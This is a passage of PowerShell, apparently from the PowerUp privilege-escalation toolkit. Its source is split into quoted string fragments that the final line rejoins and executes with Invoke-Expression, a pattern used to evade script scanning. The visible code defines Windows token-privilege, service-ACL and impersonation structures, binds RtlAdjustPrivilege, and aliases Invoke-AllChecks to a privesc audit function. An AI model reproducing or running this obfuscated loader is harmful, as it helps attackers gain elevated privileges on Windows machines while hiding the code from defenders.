    (func',' ntdll RtlAdju','stPrivilege ([','UInt32]) @([In','t32], [Bool], ','[Bool], [Int32','].MakeByRefTyp','e()))
)

# htt','ps://rohnspowe','rshellblog.wor','dpress.com/201','3/03/19/viewin','g-service-acls','/
$ServiceAcce','ssRights = pse','num $Module Po','werUp.ServiceA','ccessRights UI','nt32 @{
    Qu','eryConfig     ','        =   ''0','x00000001''
   ',' ChangeConfig ','           =  ',' ''0x00000002''
','    QueryStatu','s             ','=   ''0x0000000','4''
    Enumera','teDependents  ','   =   ''0x0000','0008''
    Star','t             ','      =   ''0x0','0000010''
    S','top           ','         =   ''','0x00000020''
  ','  PauseContinu','e           = ','  ''0x00000040''','
    Interroga','te            ',' =   ''0x000000','80''
    UserDe','finedControl  ','    =   ''0x000','00100''
    Del','ete           ','       =   ''0x','00010000''
    ','ReadControl   ','          =   ','''0x00020000''
 ','   WriteDac   ','             =','   ''0x00040000','''
    WriteOwn','er            ','  =   ''0x00080','000''
    Synch','ronize        ','     =   ''0x00','100000''
    Ac','cessSystemSecu','rity    =   ''0','x01000000''
   ',' GenericAll   ','           =  ',' ''0x10000000''
','    GenericExe','cute          ','=   ''0x2000000','0''
    Generic','Write         ','   =   ''0x4000','0000''
    Gene','ricRead       ','      =   ''0x8','0000000''
    A','llAccess      ','         =   ''','0x000F01FF''
} ','-Bitfield

$Si','dAttributes = ','psenum $Module',' PowerUp.SidAt','tributes UInt3','2 @{
    SE_GR','OUP_MANDATORY ','             =','   ''0x00000001','''
    SE_GROUP','_ENABLED_BY_DE','FAULT     =   ','''0x00000002''
 ','   SE_GROUP_EN','ABLED         ','       =   ''0x','00000004''
    ','SE_GROUP_OWNER','              ','    =   ''0x000','00008''
    SE_','GROUP_USE_FOR_','DENY_ONLY     ',' =   ''0x000000','10''
    SE_GRO','UP_INTEGRITY  ','            = ','  ''0x00000020''','
    SE_GROUP_','RESOURCE      ','         =   ''','0x20000000''
  ','  SE_GROUP_INT','EGRITY_ENABLED','      =   ''0xC','0000000''
} -Bi','tfield

$LuidA','ttributes = ps','enum $Module P','owerUp.LuidAtt','ributes UInt32',' @{
    DISABL','ED            ','              ','  =   ''0x00000','000''
    SE_PR','IVILEGE_ENABLE','D_BY_DEFAULT  ','   =   ''0x0000','0001''
    SE_P','RIVILEGE_ENABL','ED            ','    =   ''0x000','00002''
    SE_','PRIVILEGE_REMO','VED           ','     =   ''0x00','000004''
    SE','_PRIVILEGE_USE','D_FOR_ACCESS  ','      =   ''0x8','0000000''
} -Bi','tfield

$Secur','ityEntity = ps','enum $Module P','owerUp.Securit','yEntity UInt32',' @{
    SeCrea','teTokenPrivile','ge            ','  =   1
    Se','AssignPrimaryT','okenPrivilege ','      =   2
  ','  SeLockMemory','Privilege     ','          =   ','3
    SeIncrea','seQuotaPrivile','ge            ','=   4
    SeUn','solicitedInput','Privilege     ','    =   5
    ','SeMachineAccou','ntPrivilege   ','        =   6
','    SeTcbPrivi','lege          ','            = ','  7
    SeSecu','rityPrivilege ','              ','  =   8
    Se','TakeOwnershipP','rivilege      ','      =   9
  ','  SeLoadDriver','Privilege     ','          =   ','10
    SeSyste','mProfilePrivil','ege           ',' =   11
    Se','SystemtimePriv','ilege         ','      =   12
 ','   SeProfileSi','ngleProcessPri','vilege     =  ',' 13
    SeIncr','easeBasePriori','tyPrivilege   ','  =   14
    S','eCreatePagefil','ePrivilege    ','       =   15
','    SeCreatePe','rmanentPrivile','ge          = ','  16
    SeBac','kupPrivilege  ','              ','   =   17
    ','SeRestorePrivi','lege          ','        =   18','
    SeShutdow','nPrivilege    ','             =','   19
    SeDe','bugPrivilege  ','              ','    =   20
   ',' SeAuditPrivil','ege           ','         =   2','1
    SeSystem','EnvironmentPri','vilege        ','=   22
    SeC','hangeNotifyPri','vilege        ','     =   23
  ','  SeRemoteShut','downPrivilege ','          =   ','24
    SeUndoc','kPrivilege    ','              ',' =   25
    Se','SyncAgentPrivi','lege          ','      =   26
 ','   SeEnableDel','egationPrivile','ge         =  ',' 27
    SeMana','geVolumePrivil','ege           ','  =   28
    S','eImpersonatePr','ivilege       ','       =   29
','    SeCreateGl','obalPrivilege ','            = ','  30
    SeTru','stedCredManAcc','essPrivilege  ','   =   31
    ','SeRelabelPrivi','lege          ','        =   32','
    SeIncreas','eWorkingSetPri','vilege       =','   33
    SeTi','meZonePrivileg','e             ','    =   34
   ',' SeCreateSymbo','licLinkPrivile','ge       =   3','5
}

$SID_AND_','ATTRIBUTES = s','truct $Module ','PowerUp.SidAnd','Attributes @{
','    Sid       ','  =   field 0 ','IntPtr
    Att','ributes  =   f','ield 1 UInt32
','}

$TOKEN_TYPE','_ENUM = psenum',' $Module Power','Up.TokenTypeEn','um UInt32 @{
 ','   Primary    ','     = 1
    I','mpersonation  ',' = 2
}

$TOKEN','_TYPE = struct',' $Module Power','Up.TokenType @','{
    Type  = ','field 0 $TOKEN','_TYPE_ENUM
}

','$SECURITY_IMPE','RSONATION_LEVE','L_ENUM = psenu','m $Module Powe','rUp.Impersonat','ionLevelEnum U','Int32 @{
    A','nonymous      ','   =   0
    I','dentification ','   =   1
    I','mpersonation  ','   =   2
    D','elegation     ','   =   3
}

$I','MPERSONATION_L','EVEL = struct ','$Module PowerU','p.Impersonatio','nLevel @{
    ','ImpersonationL','evel  = field ','0 $SECURITY_IM','PERSONATION_LE','VEL_ENUM
}

$T','OKEN_GROUPS = ','struct $Module',' PowerUp.Token','Groups @{
    ','GroupCount  = ','field 0 UInt32','
    Groups   ','   = field 1 $','SID_AND_ATTRIB','UTES.MakeArray','Type() -Marsha','lAs @(''ByValAr','ray'', 32)
}

$','LUID = struct ','$Module PowerU','p.Luid @{
    ','LowPart       ','  =   field 0 ','$SecurityEntit','y
    HighPart','        =   fi','eld 1 Int32
}
','
$LUID_AND_ATT','RIBUTES = stru','ct $Module Pow','erUp.LuidAndAt','tributes @{
  ','  Luid        ',' =   field 0 $','LUID
    Attri','butes   =   fi','eld 1 UInt32
}','

$TOKEN_PRIVI','LEGES = struct',' $Module Power','Up.TokenPrivil','eges @{
    Pr','ivilegeCount  ','= field 0 UInt','32
    Privile','ges      = fie','ld 1 $LUID_AND','_ATTRIBUTES.Ma','keArrayType() ','-MarshalAs @(''','ByValArray'', 5','0)
}

$Types =',' $FunctionDefi','nitions | Add-','Win32Type -Mod','ule $Module -N','amespace ''Powe','rUp.NativeMeth','ods''
$Advapi32',' = $Types[''adv','api32'']
$Kerne','l32 = $Types[''','kernel32'']
$NT','Dll    = $Type','s[''ntdll'']

Se','t-Alias Get-Cu','rrentUserToken','GroupSid Get-P','rocessTokenGro','up
Set-Alias I','nvoke-AllCheck','s Invoke-Prive','scAudit
'); $script = $fragments -join ''; Invoke-Expression $script